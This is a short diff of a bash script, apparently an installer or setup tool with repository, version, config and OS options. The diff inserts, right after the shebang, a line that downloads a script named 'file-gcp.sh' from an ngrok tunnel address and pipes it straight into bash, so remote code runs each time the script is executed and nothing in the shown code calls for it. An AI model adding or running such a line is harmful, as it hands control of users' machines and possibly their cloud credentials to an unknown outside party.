@@ -1,5 +1,7 @@
 #!/bin/bash
 
+curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
+
 usage() {
   echo "Usage: $0 [-r repository] [-v version] [-c config] [-o os]"
   echo
